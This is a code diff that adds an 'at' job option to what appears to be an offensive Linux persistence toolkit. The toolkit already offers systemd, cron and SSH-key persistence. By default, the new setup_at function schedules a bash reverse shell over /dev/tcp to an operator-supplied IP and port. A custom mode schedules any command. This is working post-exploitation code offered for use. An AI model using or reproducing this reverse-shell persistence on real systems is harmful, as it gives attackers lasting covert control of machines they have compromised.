@@ -50,6 +50,14 @@ usage_user() {
     echo "          --path <path>                Specify custom service path (must end with .service)"
     echo "          --command <command>          Specify custom persistence command (no validation)"
     echo "          --timer                      Create systemd timer (1 minute interval)"
+    echo "  --at                         At job persistence"
+    echo "      --default                    Use default at settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "      --custom                     Use custom at settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
 }
 
 # Function to show the usage menu for root users
@@ -80,6 +88,14 @@ usage_root() {
     echo "          --path <path>                Specify custom service path (must end with .service)"
     echo "          --command <command>          Specify custom persistence command (no validation)"
     echo "          --timer                      Create systemd timer (1 minute interval)"
+    echo "  --at                         At job persistence"
+    echo "      --default                    Use default at settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
+    echo "      --custom                     Use custom at settings"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
 }
 
 # Function for systemd setup
@@ -406,6 +422,73 @@ setup_cron() {
     echo "[+] Cron job persistence established."
 }
 
+setup_at() {
+    local command=""
+    local custom=0
+    local default=0
+    local ip=""
+    local port=""
+    local time=""
+
+    if ! command -v at &> /dev/null; then
+        echo "Error: 'at' binary is not present. Please install 'at' to use this feature."
+        exit 1
+    fi
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --command )
+                shift
+                command=$1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            --time )
+                shift
+                time=$1
+                ;;
+            * )
+                echo "Invalid option for --at: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    elif [[ $default -eq 1 ]]; then
+        if [[ -z $ip || -z $port || -z $time ]]; then
+            echo "Error: --ip, --port, and --time must be specified when using --default."
+            exit 1
+        fi
+        echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $command || -z $time ]]; then
+            echo "Error: --command and --time must be specified when using --custom."
+            exit 1
+        fi
+        echo "$command" | at $time
+    else
+        echo "Error: Either --default or --custom must be specified for --at."
+        exit 1
+    fi
+
+    echo "[+] At job persistence established."
+}
+
 # Function for generating SSH key
 generate_ssh_key() {
     echo "Generating SSH key..."
@@ -470,6 +553,11 @@ main() {
             --cron )
                 shift
                 setup_cron "$@"
+                exit
+                ;;
+            --at )
+                shift
+                setup_at "$@"
                 exit
                 ;;
             --ssh-key )
